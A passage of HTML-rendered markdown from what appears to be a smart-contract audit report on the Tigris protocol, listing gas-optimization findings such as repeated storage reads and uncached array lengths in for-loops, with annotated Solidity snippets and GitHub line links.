class=\"grvsc-source\"><span class=\"mtk3\">/// @audit assets on line 54 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">54</span><span class=\"mtk1\">:               </span><span class=\"mtk12\">userPaid</span><span class=\"mtk1\">[</span><span class=\"mtk12\">to</span><span class=\"mtk1\">][</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]] += </span><span class=\"mtk12\">accRewardsPerNFT</span><span class=\"mtk1\">[</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit assets on line 68 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">:               </span><span class=\"mtk12\">userPaid</span><span class=\"mtk1\">[</span><span class=\"mtk12\">to</span><span class=\"mtk1\">][</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]] += </span><span class=\"mtk12\">accRewardsPerNFT</span><span class=\"mtk1\">[</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit assets on line 79 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">79</span><span class=\"mtk1\">:               </span><span class=\"mtk12\">userDebt</span><span class=\"mtk1\">[</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]] += </span><span class=\"mtk12\">accRewardsPerNFT</span><span class=\"mtk1\">[</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit assets on line 79 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit assets on line 80 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">80</span><span class=\"mtk1\">:               </span><span class=\"mtk12\">userDebt</span><span class=\"mtk1\">[</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]] -= </span><span class=\"mtk12\">userPaid</span><span class=\"mtk1\">[</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]]/</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit assets on line 80 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit assets on line 81 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">81</span><span class=\"mtk1\">:               </span><span class=\"mtk12\">userPaid</span><span class=\"mtk1\">[</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]] -= </span><span class=\"mtk12\">userPaid</span><span class=\"mtk1\">[</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]]/</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);            </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit assets on line 96 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">:               </span><span class=\"mtk12\">userDebt</span><span class=\"mtk1\">[</span><span class=\"mtk12\">from</span><span class=\"mtk1\">][</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]] += </span><span class=\"mtk12\">accRewardsPerNFT</span><span class=\"mtk1\">[</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit assets on line 96 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit assets on line 97 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">97</span><span class=\"mtk1\">:               </span><span class=\"mtk12\">userDebt</span><span class=\"mtk1\">[</span><span class=\"mtk12\">from</span><span class=\"mtk1\">][</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]] -= </span><span class=\"mtk12\">userPaid</span><span class=\"mtk1\">[</span><span class=\"mtk12\">from</span><span class=\"mtk1\">][</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]]/</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit assets on line 97 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit assets on line 98 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">98</span><span class=\"mtk1\">:               </span><span class=\"mtk12\">userPaid</span><span class=\"mtk1\">[</span><span class=\"mtk12\">from</span><span class=\"mtk1\">][</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]] -= </span><span class=\"mtk12\">userPaid</span><span class=\"mtk1\">[</span><span class=\"mtk12\">from</span><span class=\"mtk1\">][</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]]/</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit assets on line 98 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit assets on line 99 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">99</span><span class=\"mtk1\">:               </span><span class=\"mtk12\">userPaid</span><span class=\"mtk1\">[</span><span class=\"mtk12\">to</span><span class=\"mtk1\">][</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]] += </span><span class=\"mtk12\">accRewardsPerNFT</span><span class=\"mtk1\">[</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]];</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L54</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"194\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PairsContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _idToAsset[_asset].minLeverage on line 81 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">84</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">maxLeverage</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">_idToAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">minLeverage</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Wrong leverage values&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L84</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"195\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _trades[_id].margin on line 232 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">233</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">initId</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">accInterestPerOi</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tigAsset</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">direction</span><span class=\"mtk1\">]*</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">margin</span><span class=\"mtk1\">*</span><span class=\"mtk12\">_trades</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">leverage</span><span class=\"mtk1\">/</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">)/</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L233</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"196\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit limitOrderPriceRange on line 496 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">496</span><span class=\"mtk1\">:              </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_price</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\">+</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\">*</span><span class=\"mtk12\">limitOrderPriceRange</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">_price</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\">-</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\">*</span><span class=\"mtk12\">limitOrderPriceRange</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">) </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;6&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//LimitNotMet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit maxWinPercent on line 625 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">625</span><span class=\"mtk1\">:                  </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">maxWinPercent</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_toMint</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">margin</span><span class=\"mtk1\">*</span><span class=\"mtk12\">maxWinPercent</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit maxWinPercent on line 625 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">626</span><span class=\"mtk1\">:                      </span><span class=\"mtk12\">_toMint</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">margin</span><span class=\"mtk1\">*</span><span class=\"mtk12\">maxWinPercent</span><span class=\"mtk1\">/</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit blockDelay on line 861 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">864</span><span class=\"mtk1\">:                  </span><span class=\"mtk12\">blockDelayPassed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">delay</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">blockDelay</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L496</p>\n<h2 id=\"g25--arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop\" style=\"position:relative;\"><a href=\"#g25--arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop\" aria-label=\"g25  arraylength should not be looked up in every loop of a for loop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑25]  <code>&#x3C;array>.length</code> should not be looked up in every loop of a <code>for</code>-loop</h2>\n<p>The overheads outlined below are <em>PER LOOP</em>, excluding the first loop</p>\n<ul>\n<li>storage arrays incur a Gwarmaccess (<strong>100 gas</strong>)</li>\n<li>memory arrays use <code>MLOAD</code> (<strong>3 gas</strong>)</li>\n<li>calldata arrays use <code>CALLDATALOAD</code> (<strong>3 gas</strong>)</li>\n</ul>\n<p>Caching the length changes each of these to a <code>DUP&#x3C;N></code> (<strong>3 gas</strong>), and gets rid of the extra <code>DUP&#x3C;N></code> needed to store the stack offset</p>\n<p><em>There are 13 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"197\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">284</span><span class=\"mtk1\">:              </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">292</span><span class=\"mtk1\">:              </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">300</span><span class=\"mtk1\">:              </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">342</span><span class=\"mtk1\">:              </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L284</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"198\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">131</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">200</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">246</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">252</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">258</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">325</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L131</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"199\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Lock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L113</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"200\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">296</span><span class=\"mtk1\">:          </span><span 